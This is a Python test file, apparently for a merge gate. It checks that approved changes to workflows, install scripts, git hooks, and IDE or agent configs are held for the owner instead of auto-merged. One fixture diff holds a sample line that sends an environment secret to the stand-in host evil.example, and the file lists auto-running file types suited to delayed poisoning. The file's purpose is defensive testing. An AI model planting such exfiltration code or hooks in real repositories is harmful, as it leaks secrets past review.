"""Delayed and persistent poisoning: a change that leaks or acts later, after review, must never auto-merge.

Each class of file that runs on its own later (a workflow, a hook, an install script, an IDE or agent config) is fed to the
real merge gate as a small, fully approved, green change. The gate must leave it for the owner. A class the gate lets
through is marked expectedFailure with its GAP, so the suite stays green and the hole stays written down.
"""
import pathlib
import sys
import unittest

KIT = pathlib.Path(__file__).resolve().parent.parent
sys.path.insert(0, str(KIT / "scripts"))
try:
    import test_merge_gate as base
except ImportError:  # run as tests.test_x from the repo root
    from tests import test_merge_gate as base


class DelayedExfil(unittest.TestCase):
    """Same fixture as the merge gate tests, with every other check passing so only the path can decide."""
    setUp, gate, merged = base.Gate.setUp, base.Gate.gate, base.Gate.merged  # borrowed, so the gate tests do not rerun here

    def change(self, path, patch=None):
        self.files["diff.txt"] = f"A\t{path}\nA\ttests/test_a.py\n"
        self.files["numstat.txt"] = f"3\t0\t{path}\n10\t0\ttests/test_a.py\n"
        if patch:
            self.files["diff.patch"] = patch

    def held(self, path, patch=None):
        self.change(path, patch)
        code, out = self.gate()
        self.assertEqual(code, 4, f"{path} auto-merged: {out}")
        self.assertIn("it touches", out)
        self.assertFalse(self.merged(), out)

    def test_keep_ordinary_source_change_still_merges(self):
        self.change("src/report.py")
        self.assertEqual(self.gate(), (0, "merged " + "c" * 40))

    def test_keep_ordinary_second_source_change_still_merges(self):
        self.change("lib/util.js")
        self.assertEqual(self.gate(), (0, "merged " + "c" * 40))

    def test_workflow_pull_request_target(self):
        self.held(".github/workflows/triage.yml")

    def test_workflow_with_secrets_and_curl(self):
        self.held(".github/workflows/nightly.yaml")

    def test_github_folder_nested_workflow_path(self):
        self.held("sub/.github/workflows/x.yml")

    def test_git_hook_folder(self):
        self.held("hooks/pre-push")

    def test_husky(self):
        self.held(".husky/pre-commit")

    def test_package_json_install_scripts(self):
        self.held("package.json")

    def test_makefile(self):
        self.held("Makefile")

    def test_setup_py(self):
        self.held("setup.py")

    def test_conftest_py(self):
        self.held("tests/conftest.py")

    def test_claude_settings_hooks(self):
        self.held(".claude/settings.json")

    def test_mcp_json(self):
        self.held(".mcp.json")

    def test_envrc(self):
        self.held(".envrc")

    def test_pre_commit_framework_config(self):
        self.held(".pre-commit-config.yaml")

    def test_new_executable_file_is_held_by_mode(self):
        self.change("scripts/sync.sh", "diff --git a/scripts/sync.sh b/scripts/sync.sh\nnew file mode 100755\n--- /dev/null\n+++ b/scripts/sync.sh\n@@ -0,0 +1 @@\n+x\n")
        code, out = self.gate()
        self.assertEqual(code, 4, out)
        self.assertIn("file mode", out)

    # Gaps: each passes the gate today. Fix the gate, then remove the decorator.
    def test_devcontainer(self):
        self.held(".devcontainer/devcontainer.json")

    def test_githooks_folder(self):
        self.held(".githooks/pre-commit")

    def test_vscode_tasks(self):
        self.held(".vscode/tasks.json")

    def test_justfile(self):
        self.held("justfile")

    def test_python_startup_hook(self):
        self.held("sitecustomize.py")

    @unittest.expectedFailure
    def test_network_code_in_a_test_file(self):
        # GAP: a new test that posts to an outside host passes; stop_code has no network pattern and CI runs it on main later.
        self.held("tests/test_sync.py", "diff --git a/tests/test_sync.py b/tests/test_sync.py\nnew file mode 100644\n--- /dev/null\n+++ b/tests/test_sync.py\n@@ -0,0 +1 @@\n+urllib.request.urlopen('https://evil.example/?k=' + os.environ['K'])\n")


if __name__ == "__main__":
    unittest.main()
